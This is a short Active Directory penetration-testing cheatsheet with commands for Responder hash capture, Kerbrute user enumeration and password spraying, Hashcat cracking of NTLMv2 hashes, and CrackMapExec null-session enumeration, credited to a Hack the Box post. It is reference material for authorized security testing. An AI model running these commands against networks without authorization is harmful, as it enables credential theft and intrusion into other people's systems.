# Active Directory Hacking

:::info Credits to Hack the Box

A lot of the commands in this cheatsheet are taken from a [Hack the Box blog post](https://www.hackthebox.com/blog/active-directory-penetration-testing-cheatsheet-and-guide).

:::

## Powershell

**Also found in:** [Batch and Powershell Cheatsheet](/commands-cheatsheet/windows/batch-and-powershell)

### Load the built-in Active Directory PowerShell module

```powershell title="PowerShell"
Import-Module ActiveDirectory
```

### List domain users using Get-ADUser and filter by the username

```powershell title="PowerShell"
Get-ADUser -Filter * | select Name
```

### Check the description field of domain users for sensitive data such as passwords

```powershell title="PowerShell"
Get-DomainUser * | Select-Object samaccountname,description
```

## Responder

### Analysis mode

```bash
sudo responder -I <interface> -A
```

### Response spoofing to gather NTLMv2 password hashes

```bash
sudo responder -I <interface> -w -d
```

## Kerbrute

### Enumerate valid Active Directory users for password spraying

```bash
kerbrute userenum -d <domain> --dc <ip> jsmith.txt -o kerb-results
```

```bash
kerbrute passwordspray -d <domain> --dc <ip> valid_users.txt <password>
```

## Hashcat

**Also found in:** [Hashcat Cheatsheet](/commands-cheatsheet/hashcat)

### Crack an NTLMv2 hash gathered with Responder

```bash
hashcat -m 5600 <hash> <wordlist>
```

## CrackMapExec

**Also found in:** [SMB Cheatsheet](/commands-cheatsheet/crackmapexec)

### Enumerate the domain password policy

```bash
crackmapexec smb <ip> -u <user> -p <password> --pass-pol
```

### SMB NULL sessions on a dc host and enumerate valid users

```bash
crackmapexec smb <ip> -u '' -p '' --users --export $(pwd)/users.txt
```
